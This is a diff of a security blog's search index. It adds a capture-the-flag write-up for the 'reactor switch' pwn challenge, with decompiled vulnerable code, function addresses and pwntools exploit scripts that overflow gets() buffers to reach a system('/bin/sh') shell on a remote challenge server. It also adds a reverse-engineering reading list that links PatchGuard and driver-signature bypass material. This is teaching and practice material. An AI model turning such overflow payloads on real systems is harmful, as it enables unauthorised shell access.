@@ -1,9 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ADWorld PWN Challenge Area Write-up (reactor switch)</title>
+    <url>/2020/07/29/ADWorld-PWN-Challenge-Area-Write-up-reactor-switch/</url>
+    <content><![CDATA[<p>Too much efforts for writing an essay with several challenges included, so I decide to analyze one challenge later in each essay..</p>
+<h2 id="reactor-switch"><a href="#reactor-switch" class="headerlink" title="reactor switch"></a>reactor switch</h2><p>Attachment: <a href="/filehost/apcaw/reactor_switch">reactor_switch</a><br>Description: Lil M discovered the interface of a nitrification reactor in a TNT production line in a private mine. She suspects that this factory might be engaged in the production of underground munitions, so Lil M intends to interfere with the operation of this TNT production line by closing the reactor, but the reactor has multiple gates, so she has to find a way to help her close all the gates.</p>
+<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p>Check:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file reactor_switch</span><br><span class="line">reactor_switch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=6145840505e7d75d0020a02b556136ce4c936ed9, not stripped</span><br><span class="line">$ checksec reactor_switch</span><br><span class="line">[*] <span class="string">'/root/reactor_switch'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>Pseudocode:<br><code>main</code>:<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-240h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+40h] [rbp-200h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Please closing the reaction kettle\n"</span>, <span class="number">0x23</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"The switch is:"</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%p\n"</span>, easy);</span><br><span class="line">  write(<span class="number">1</span>, &amp;s, <span class="number">9u</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"&gt;"</span>, <span class="number">2u</span>LL);</span><br><span class="line">  gets(&amp;v5, <span class="string">"&gt;"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>easy</code>:<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">easy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1C0h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+40h] [rbp-180h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"You have closed the first switch\n"</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Please closing the second reaction kettle\n"</span>, <span class="number">0x2A</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"The switch is:"</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%p\n"</span>, normal);</span><br><span class="line">  write(<span class="number">1</span>, &amp;s, <span class="number">9u</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"&gt;"</span>, <span class="number">2u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v2, <span class="string">"&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>normal</code>:<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">normal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-140h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+40h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"You have closed the first switch\n"</span>, <span class="number">0x22</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Please closing the third reaction kettle\n"</span>, <span class="number">0x2A</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"The switch is:"</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%p\n"</span>, shell);</span><br><span class="line">  write(<span class="number">1</span>, &amp;s, <span class="number">9u</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"&gt;"</span>, <span class="number">2u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v2, <span class="string">"&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>shell</code>:<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Addresses:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easy	00000000004006B0	</span><br><span class="line">main	0000000000400759	</span><br><span class="line">normal	0000000000400607	</span><br><span class="line">shell	00000000004005F6</span><br></pre></td></tr></table></figure></p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Well, according to the description, I thought it would be a series of tasks. As for the codes, It seems to let us overflow 3 times to get shell.<br>For one thing, the program wasn’t written carefully since it always prints <code>You have closed the first switch</code> in <code>main()</code>, <code>easy()</code> and <code>normal()</code> (should be 1st, 2nd and 3rd, right?); for another thing, as we just want to get shell, we can overflow just once (unexpect solution: overflow to return to <code>shell()</code>).</p>
+<p>Offsets for three functions: <code>0x200</code> for <code>main()</code>; <code>0x180</code> for <code>easy()</code>; <code>0x100</code> for <code>normal()</code>.</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>From <code>main()</code> return to <code>easy()</code> to <code>normal()</code> to <code>shell()</code>:<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./reactor_switch"</span>)</span><br><span class="line">sh = remote(<span class="string">'220.249.52.133'</span>,<span class="number">42608</span>)</span><br><span class="line"></span><br><span class="line">main_offset = <span class="number">0x200</span></span><br><span class="line">easy_offset = <span class="number">0x180</span></span><br><span class="line">normal_offset = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">easy_func_addr = <span class="number">0x04006b0</span></span><br><span class="line">normal_func_addr = <span class="number">0x0400607</span></span><br><span class="line">shell_func_addr = <span class="number">0x04005F6</span></span><br><span class="line">payload1 = <span class="string">'a'</span> * main_offset + p64(<span class="number">0</span>) + p64(easy_func_addr)</span><br><span class="line">payload2 = <span class="string">'a'</span> * easy_offset + p64(<span class="number">0</span>) + p64(normal_func_addr)</span><br><span class="line">payload3 = <span class="string">'a'</span> * normal_offset + p64(<span class="number">0</span>) + p64(shell_func_addr)</span><br><span class="line"><span class="keyword">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"><span class="keyword">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>Unexpect solution: From <code>main()</code> return to <code>shell()</code>:<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./reactor_switch"</span>)</span><br><span class="line">sh = remote(<span class="string">'220.249.52.133'</span>,<span class="number">42608</span>)</span><br><span class="line"></span><br><span class="line">shell_func_addr = <span class="number">0x04005F6</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">512</span> + p64(<span class="number">0</span>) + p64(shell_func_addr)</span><br><span class="line"><span class="keyword">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>pwn</tag>
+        <tag>stack overflow</tag>
+        <tag>rop</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ADWorld PWN Exercise Area Write-ups (ROP part)</title>
     <url>/2020/07/27/2020-07-27-ADWorld-PWN-Exercise-Area-Write-ups-ROP-part/</url>
-    <content><![CDATA[<h2 id="Stack-Overflow-amp-ROP"><a href="#Stack-Overflow-amp-ROP" class="headerlink" title="Stack Overflow &amp; ROP"></a>Stack Overflow &amp; ROP</h2><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>Attachment: <a href="/filehost/apeaw/level0">level0</a><br>Description: Caiji understands what overflow is, he believes he can get a shell</p>
+    <content><![CDATA[<p>This part is for <code>ROP</code> (return oriented programming) type challenges, but still very basic. </p>
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>Attachment: <a href="/filehost/apeaw/level0">level0</a><br>Description: Caiji understands what overflow is, he believes he can get a shell.</p>
 <p>Check:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file level0</span><br><span class="line">level0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped</span><br><span class="line">$ checksec level0</span><br><span class="line">[*] <span class="string">'/root/level0'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
 <p>Pseudocode:<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">--------------------------------- main </span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- vulnerable_function</span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- callsystem   -- <span class="keyword">not</span> in the main logic</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- assembly &amp; address of callsystem</span><br><span class="line">.text:<span class="number">0000000000400596</span>     <span class="keyword">public</span> callsystem</span><br><span class="line">.text:<span class="number">0000000000400596</span>     callsystem proc near</span><br><span class="line">.text:<span class="number">0000000000400596</span>     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400596</span> <span class="number">000</span> push    rbp</span><br><span class="line">.text:<span class="number">0000000000400597</span> <span class="number">008</span> mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040059</span>A <span class="number">008</span> mov     edi, offset command ; <span class="string">"/bin/sh"</span></span><br><span class="line">.text:<span class="number">000000000040059F</span> <span class="number">008</span> call    _system</span><br><span class="line">.text:<span class="number">00000000004005</span>A4 <span class="number">008</span> pop     rbp</span><br><span class="line">.text:<span class="number">00000000004005</span>A5 <span class="number">000</span> retn</span><br><span class="line">.text:<span class="number">00000000004005</span>A5     ; &#125; <span class="comment">// starts at 400596</span></span><br><span class="line">.text:<span class="number">00000000004005</span>A5     callsystem endp</span><br></pre></td></tr></table></figure></p>
 <p>The vulnerability exists in <code>vulnerable_function</code>, because <code>buf</code> can only store <code>0x80</code> on the stack but it reads <code>0x200</code>. Things on the stack:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">           +-----------------+&lt;---high address</span><br><span class="line">           |     retaddr     |</span><br><span class="line">           +-----------------+</span><br><span class="line">           |     saved ebp   |</span><br><span class="line">    ebp---&gt;+-----------------+</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |       buf       |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">ebp-0x80--&gt;+-----------------+&lt;---low address</span><br></pre></td></tr></table></figure></p>
@@ -120,9 +147,9 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
         <tag>linux</tag>
         <tag>pwn</tag>
         <tag>stack overflow</tag>
-        <tag>format string</tag>
         <tag>write-ups</tag>
         <tag>ctf</tag>
+        <tag>format string</tag>
         <tag>buffer overflow</tag>
       </tags>
   </entry>
@@ -3465,6 +3492,118 @@ $ hexo s -g
       </tags>
   </entry>
   <entry>
+    <title>Reverse Engineering Reading List</title>
+    <url>/2018/10/01/2018-09-31-Reverse-Engineering-Reading-List/</url>
+    <content><![CDATA[<p><strong>From <a href="https://github.com/onethawt/" target="_blank" rel="noopener">onethawt</a></strong></p>
+<p>If any of the links are down and you can’t retrieve them on <a href="http://archive.org" target="_blank" rel="noopener">archive.org</a>, <a href="http://one.thawt.io/contact/" target="_blank" rel="noopener">contact me</a> and I can give you a copy of the document.</p>
+<h2 id="Software-amp-Libraries"><a href="#Software-amp-Libraries" class="headerlink" title="Software &amp; Libraries"></a>Software &amp; Libraries</h2><ul>
+<li><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="noopener">IDA Pro</a>: The <strong>KING</strong> IDA is a Windows, Linux or Mac OS X hosted multi-processor disassembler and debugger that offers so many features it is hard to describe them all.</li>
+<li><a href="https://github.com/NationalSecurityAgency/ghidra" target="_blank" rel="noopener">Ghidra</a>: Ghidra is a software reverse engineering (SRE) framework created and maintained by the National Security Agency Research Directorate. This framework includes a suite of full-featured, high-end software analysis tools that enable users to analyze compiled code on a variety of platforms including Windows, Mac OS, and Linux. Capabilities include disassembly, assembly, decompilation, graphing, and scripting, along with hundreds of other features. Ghidra supports a wide variety of process instruction sets and executable formats and can be run in both user-interactive and automated modes. Users may also develop their own Ghidra plug-in components and/or scripts using Java or Python.</li>
+<li><a href="https://binary.ninja/" target="_blank" rel="noopener">Binary Ninja</a>: A reverse engineering platform. It focuses on a clean and easy to use interface with a powerful multithreaded analysis built on a custom IL to quickly adapt to a variety of architectures, platforms, and compilers.</li>
+<li><a href="http://www.capstone-engine.org/" target="_blank" rel="noopener">Capstone</a>: Capstone is a lightweight multi-platform, multi-architecture disassembly framework. Our target is to make Capstone the ultimate disassembly engine for binary analysis and reversing in the security community.</li>
+<li><a href="https://www.hopperapp.com/" target="_blank" rel="noopener">Hopper</a>: Hopper is a reverse engineering tool for OS X and Linux, that lets you disassemble, and decompile your 32/64bits Intel Mac, Linux, Windows and iOS executables! Based on capstone, scriptable.</li>
+<li><a href="https://github.com/Maratyszcza/PeachPy" target="_blank" rel="noopener">PeachPy</a>: Portable efficient assembly code-generator in higher-level python.</li>
+<li><a href="http://www.radare.org/" target="_blank" rel="noopener">Radare2</a>: Portable reversing framework for disassembly, debugging, forensics, etc. Based on capstone, scriptable.</li>
+<li><a href="http://x64dbg.com/" target="_blank" rel="noopener">x64dbg</a>: Open source x64/x32 Windows debugger. Heir to Olly.</li>
+<li><a href="https://github.com/cboin/re_lab" target="_blank" rel="noopener">re_lab</a>: A portable reverse engineering environment using docker.</li>
+</ul>
+<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><ul>
+<li><a href="https://github.com/rednaga/training/tree/master/DEFCON23" target="_blank" rel="noopener">Offensive &amp; Defensive Android Reverse Engineering</a></li>
+</ul>
+<h2 id="Assembly-Disassembly"><a href="#Assembly-Disassembly" class="headerlink" title="Assembly / Disassembly"></a>Assembly / Disassembly</h2><ul>
+<li><a href="http://blog.ptsecurity.com/2015/07/best-reverser-write-up-analyzing.html" target="_blank" rel="noopener">Analyzing Uncommon Firmware</a></li>
+<li><a href="https://drive.google.com/file/d/0B0l-Qo3D3sAoMEhkcFBFVzRiNEk/view" target="_blank" rel="noopener">ARM v7 Disassembling</a></li>
+<li><a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/wang-shuai" target="_blank" rel="noopener">UROBOROS - Reassembling Disassembling</a> -  a tool that can disassemble executables to the extent that the generated code can be assembled back to working binaries without manual effort.</li>
+</ul>
+<h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><ul>
+<li><a href="https://vimeo.com/6764570" target="_blank" rel="noopener">Reverse Engineering 101 Speaker Presentation</a></li>
+<li><a href="https://prezi.com/a5tm-lf0879-/reverse-engineering-101-nyupoly-2010/" target="_blank" rel="noopener">Reverse Engineering 101 - NYU: Poly 2010</a>: Intro to Reverse Engineering given at NYU:Poly on October 4th, 2010 by Aaron Portnoy and Peter Silberman. </li>
+<li><a href="https://prezi.com/e5a2tumdqocj/reverse-engineering-102-nyupoly-2010/" target="_blank" rel="noopener">Reverse Engineering 102 - NYU: Poly 2010</a>: Intro to Reverse Engineering (Day 2) given at NYU:Poly on October 11th, 2010 by Aaron Portnoy and Peter Silberman.</li>
+<li><a href="https://trailofbits.github.io/ctf/" target="_blank" rel="noopener">CTF Field Guide</a></li>
+</ul>
+<h3 id="Books"><a href="#Books" class="headerlink" title="Books"></a>Books</h3><ul>
+<li><a href="https://www.amazon.com/Modern-X86-Assembly-Language-Programming/dp/1484200659" target="_blank" rel="noopener">Modern X86 Assembly Language Programming: 32-bit, 64-bit, SSE, and AVX</a>: Fundamentals of x86 assembly language programming. It focuses on the aspects of the x86 instruction set that are most relevant to application software development.</li>
+<li><a href="https://www.amazon.com/Practical-Malware-Analysis-Hands-Dissecting/dp/1593272901" target="_blank" rel="noopener">Practical Malware Analysis</a>: Practical Malware Analysis will teach you the tools and techniques used by professional analysts. With this book as your guide, you’ll be able to safely analyze, debug, and disassemble any malicious software that comes your way.</li>
+<li><a href="https://www.amazon.com/Practical-Reverse-Engineering-Reversing-Obfuscation/dp/1118787315" target="_blank" rel="noopener">Practical Reverse Engineering</a>: The book covers x86, x64, and ARM (the first book to cover all three); Windows kernel-mode code rootkits and drivers; virtual machine protection techniques; and much more. Best of all, it offers a systematic approach to the material, with plenty of hands-on exercises and real-world examples.</li>
+<li><a href="https://www.amazon.com/Reversing-Secrets-Engineering-Eldad-Eilam/dp/0764574817" target="_blank" rel="noopener">Reversing: Secrets of Reverse Engineering</a>: Beginning with a basic primer on reverse engineering-including computer internals, operating systems, and assembly language-and then discussing the various applications of reverse engineering, this book provides readers with practical, in-depth techniques for software reverse engineering.</li>
+<li><a href="https://beginners.re/" target="_blank" rel="noopener">Reverse Engineering for Beginners</a>: Available in english and russian, this ebook is a good introduction for beginners. Numerous topics are touched : Oracle RDBMS, Itanium, copy-protection dongles, LD_PRELOAD, stack overflow, ELF, win32 PE file format, x86-64, critical sections, syscalls, TLS, position-independent code (PIC), profile-guided optimization, C++ STL, OpenMP, win32 SEH.</li>
+<li><a href="https://www.amazon.com/IDA-Pro-Book-Unofficial-Disassembler/dp/1593272898" target="_blank" rel="noopener">The IDA Pro Book: The Unofficial Guide to the World’s Most Popular Disassembler</a>: Hailed by the creator of IDA Pro as “profound, comprehensive, and accurate,” the second edition of The IDA Pro Book covers everything from the very first steps to advanced automation techniques.</li>
+</ul>
+<h2 id="Data-Structures"><a href="#Data-Structures" class="headerlink" title="Data Structures"></a>Data Structures</h2><ul>
+<li><a href="https://www.isoc.org/isoc/conferences/ndss/10/pdf/23.pdf" target="_blank" rel="noopener">Automatic Reverse Engineering of Data Structures from Binary Execution</a> [PDF]</li>
+<li><a href="http://ben.ransford.org/srg/papers/cozzie--digging.pdf" target="_blank" rel="noopener">Digging For Data Structures</a> [PDF]</li>
+<li><a href="http://www.isoc.org/isoc/conferences/ndss/11/pdf/5_1.pdf" target="_blank" rel="noopener">Howard: a dynamic excavator for reverse engineering data structures</a> [PDF]</li>
+<li><a href="http://www.cs.vu.nl/~herbertb/papers/mempick_wcre13.pdf" target="_blank" rel="noopener">MemPick: High-Level Data Structure Detection in C/C++ Binaries</a> [PDF]</li>
+<li><a href="https://reverse.put.as/wp-content/uploads/2011/06/D1T2-Mark-Dowd-Tarjei-Mandt-iOS6-Security.pdf" target="_blank" rel="noopener">TIE: Principled Reverse Engineering of Types in Binary Programs</a> [PDF]</li>
+</ul>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><ul>
+<li><a href="http://www.crisalis-project.eu/sites/crisalis-project.eu/files/crisalis_deliverable-D5.3.pdf" target="_blank" rel="noopener">Automated Vulnerability Discovery Techniques</a> [PDF]</li>
+<li><a href="https://www.usenix.org/sites/default/files/sec15_supplement.pdf" target="_blank" rel="noopener">Dismantling Megamos Crypto: Wirelessly Lockpicking a Vehicle Immobilizer</a> [PDF]</li>
+<li><a href="http://software.imdea.org/~juanca/papers/sigpath_esorics14.pdf" target="_blank" rel="noopener">Memory Graph Approach for Program Data Introspection and Modification</a> [PDF]</li>
+<li><a href="http://illmatics.com/Remote%20Car%20Hacking.pdf" target="_blank" rel="noopener">Remote Exploitation of an Unaltered Passenger Vehicle</a> [PDF]</li>
+</ul>
+<h2 id="Instruction-Sets"><a href="#Instruction-Sets" class="headerlink" title="Instruction Sets"></a>Instruction Sets</h2><ul>
+<li><a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="noopener">Intel® 64 and IA-32 Architectures Software Developer Manuals</a>: These manuals describe the architecture and programming environment of the Intel® 64 and IA-32 architectures.</li>
+<li><a href="http://ref.x86asm.net/" target="_blank" rel="noopener">X86 Opcode and Instruction Reference</a>: This reference is intended to be precise opcode and instruction set reference (including x86-64). Its principal aim is exact definition of instruction parameters and attributes.</li>
+<li><a href="https://github.com/astocko/json-x86-64" target="_blank" rel="noopener">JSON x86-64 Intel instruction set</a>: The entire x86-64 Intel instruction set in a machine readable JSON format up to AVX-512.</li>
+<li><a href="http://www.felixcloutier.com/x86/" target="_blank" rel="noopener">X86-64 Reference</a>: Derived from the September 2014 version of the Intel® 64 and IA-32 Architectures Software Developer’s Manual, volumes 2A and 2B. <strong>Uses <a href="https://github.com/zneak/x86doc" target="_blank" rel="noopener">PDF mining</a> to generate the reference from official Intel docs.</strong></li>
+</ul>
+<h2 id="Mac-and-iOS"><a href="#Mac-and-iOS" class="headerlink" title="Mac and iOS"></a>Mac and iOS</h2><ul>
+<li><a href="https://github.com/iosre/iOSAppReverseEngineering" target="_blank" rel="noopener">iOS App Reverse Engineering</a>: iOS App Reverse Engineering is the world’s 1st book of very detailed iOS App reverse engineering skills</li>
+<li><a href="https://reverse.put.as/wp-content/uploads/2011/06/D1T2-Mark-Dowd-Tarjei-Mandt-iOS6-Security.pdf" target="_blank" rel="noopener">iOS Kernel Security</a> [PDF]</li>
+<li><a href="https://reverse.put.as/wp-content/uploads/2011/06/pod2g-jailbreak-techniques-wwjc-2012.pdf" target="_blank" rel="noopener">Jailbreaking Techniques</a> [PDF]</li>
+<li><a href="https://s3.amazonaws.com/s3.synack.com/T2_reversingIOSApps.pdf" target="_blank" rel="noopener">Reversing iOS Apps: A Practical Approach</a> [PDF]</li>
+</ul>
+<h2 id="Malware-Analysis"><a href="#Malware-Analysis" class="headerlink" title="Malware Analysis"></a>Malware Analysis</h2><ul>
+<li><a href="https://github.com/REhints/Publications/tree/master/Conferences/BH&#39;2015" target="_blank" rel="noopener">Distributing The Reconstruction Of High-Level Intermediate Representation For Large Scale Malware Analysis</a></li>
+</ul>
+<h3 id="Adware"><a href="#Adware" class="headerlink" title="Adware"></a>Adware</h3><ul>
+<li><a href="https://www.proteansec.com/whitepapers/Proteansec_Analysis_Disco_Savings.pdf" target="_blank" rel="noopener">Analysis of Disco Savings Adware</a> [PDF]</li>
+</ul>
+<h3 id="Trojans"><a href="#Trojans" class="headerlink" title="Trojans"></a>Trojans</h3><ul>
+<li><a href="https://www.proofpoint.com/us/threat-insight/post/You-Dirty-RAT" target="_blank" rel="noopener">You Dirty RAT: Analyzing an AlienSpy Payload</a></li>
+</ul>
+<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><p><a href="http://www.di.fc.ul.pt/~nuno/PAPERS/WCRE11.pdf" target="_blank" rel="noopener">Reverse Engineering of Protocols from Network Traces</a> [PDF]</p>
+<h2 id="Obfuscation-and-Deobfuscation"><a href="#Obfuscation-and-Deobfuscation" class="headerlink" title="Obfuscation and Deobfuscation"></a>Obfuscation and Deobfuscation</h2><ul>
+<li><a href="http://www.cacs.louisiana.edu/~arun/papers/2010-pepm-lakhotia.pdf" target="_blank" rel="noopener">Context-Sensitive Analysis of Obfuscated x86 Executables</a> [PDF]</li>
+<li><a href="http://blog.mindedsecurity.com/2015/10/advanced-js-deobfuscation-via-ast-and.html" target="_blank" rel="noopener">Advanced JS Deobfuscation Via AST and Partial Evaluation</a></li>
+</ul>
+<h2 id="Research-Tools"><a href="#Research-Tools" class="headerlink" title="Research Tools"></a>Research Tools</h2><ul>
+<li><a href="https://www.cs.virginia.edu/~weimer/p/weimer-wcre2013-re-preprint.pdf" target="_blank" rel="noopener">Genetic Programming for Reverse Engineering</a></li>
+<li><a href="https://speakerdeck.com/snf/ir-transformation-synthesis-for-assembly-instructions" target="_blank" rel="noopener">IR Transformation Synthesis for Assembly Instructions</a></li>
+</ul>
+<h2 id="Unpacking"><a href="#Unpacking" class="headerlink" title="Unpacking"></a>Unpacking</h2><ul>
+<li><a href="https://www.blackhat.com/presentations/bh-usa-07/Yason/Whitepaper/bh-usa-07-yason-WP.pdf" target="_blank" rel="noopener">The Art of Unpacking</a> [PDF]</li>
+</ul>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Driver-Signature-Enforcement"><a href="#Driver-Signature-Enforcement" class="headerlink" title="Driver Signature Enforcement"></a>Driver Signature Enforcement</h3><ul>
+<li><a href="http://j00ru.vexillium.org/?p=1169" target="_blank" rel="noopener">Defeating Windows Driver Signature Enforcement #1: default drivers</a></li>
+<li><a href="http://j00ru.vexillium.org/?p=1393" target="_blank" rel="noopener">Defeating Windows Driver Signature Enforcement #2: CSRSS and thread desktops</a></li>
+<li><a href="http://j00ru.vexillium.org/?p=1455" target="_blank" rel="noopener">Defeating Windows Driver Signature Enforcement #3: The Ultimate Encounter</a></li>
+<li><a href="http://www.kernelmode.info/forum/viewtopic.php?t=3322&amp;f=11" target="_blank" rel="noopener">DSEFix - Defeating x64 Driver Signature Enforcement: Using exploitable signed drivers - VirtualBox driver</a></li>
+</ul>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul>
+<li><a href="https://speakerdeck.com/snf/ir-transformation-synthesis-for-assembly-instructions" target="_blank" rel="noopener">HyperV and vmbus internals</a></li>
+</ul>
+<h3 id="Patch-Guard"><a href="#Patch-Guard" class="headerlink" title="Patch Guard"></a>Patch Guard</h3><ul>
+<li><a href="http://www.uninformed.org/?v=3&amp;a=3&amp;t=txt" target="_blank" rel="noopener">Bypassing PatchGuard on Windows x64</a></li>
+<li><a href="http://fyyre.ivory-tower.de/projects/bootloader.txt" target="_blank" rel="noopener">Disable PatchGuard Vista &amp; Windows 7</a></li>
+<li><a href="http://fyyre.ivory-tower.de/projects/bootloader_v2.txt" target="_blank" rel="noopener">Disable PatchGuard Windows 8 &amp; Windows 10</a></li>
+<li><a href="https://github.com/hfiref0x/UPGDSED" target="_blank" rel="noopener">Universal Patchguard and Driver Signature Enforcement Disable</a></li>
+</ul>
+<h3 id="Win32"><a href="#Win32" class="headerlink" title="Win32"></a>Win32</h3><ul>
+<li><a href="http://www.pinvoke.net/" target="_blank" rel="noopener">PInvoke.net</a>: PInvoke.net is primarily a wiki, allowing developers to find, edit and add PInvoke* signatures, user-defined types, and any other information related to calling Win32 and other unmanaged APIs from managed code (written in languages such as C# or VB.NET).</li>
+</ul>
+]]></content>
+      <categories>
